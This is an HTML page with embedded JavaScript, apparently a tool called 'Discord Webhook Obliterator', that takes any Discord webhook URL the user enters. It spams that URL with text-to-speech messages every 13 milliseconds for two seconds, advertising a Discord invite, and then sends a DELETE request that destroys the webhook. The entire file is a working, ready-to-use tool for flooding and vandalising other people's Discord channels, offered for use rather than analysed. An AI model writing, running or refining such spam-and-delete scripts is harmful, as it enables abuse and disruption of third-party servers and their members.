<!DOCTYPE html>
<html>
<head>
  <title>DWOM </title>
</head>
<body>
  <h1>(Discord Webhook Obliterator, Mobile Compatible)</h1>
  <label for="webhookUrl">Discord Webhook URL:</label>
  <input type="text" id="webhookUrl" name="webhookUrl"><br><br>
  <button onclick="spamWebhook()">FUCK IT NOEWWAE!!!1!111!!</button>

  <script>
    async function spamWebhook() {
      const webhookUrl = document.getElementById('webhookUrl').value;
      const message = "GO TO https://discord.gg/DDzqecnvRM AND NEVER BE RACIST, NEVER SCAM THE RAS TEAM";

      if (!webhookUrl) {
        alert("Please enter a webhook URL.");
        return;
      }

      async function sendMessage() {
        try {
          const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              content: message,
              tts: true,
            }),
          });

          if (!response.ok) {
            console.error(`Failed to send message: ${response.status} ${response.statusText}`);
          }
        } catch (error) {
          console.error("Error sending message:", error);
        }
      }

      async function deleteWebhook() {
          try {
              const response = await fetch(webhookUrl, {
                  method: 'DELETE',
              });
              if (!response.ok) {
                  console.error(`Failed to delete webhook: ${response.status} ${response.statusText}`);
              } else {
                console.log("webhook deleted")
              }
          } catch(error) {
              console.error("Error deleting webhook:", error);
          }
      }

      const interval = 13; // milliseconds
      let spamInterval = setInterval(sendMessage, interval);

      setTimeout(async () => {
        clearInterval(spamInterval);
        await deleteWebhook();

      }, 2000); // 2 seconds
    }
  </script>
</body>
</html>
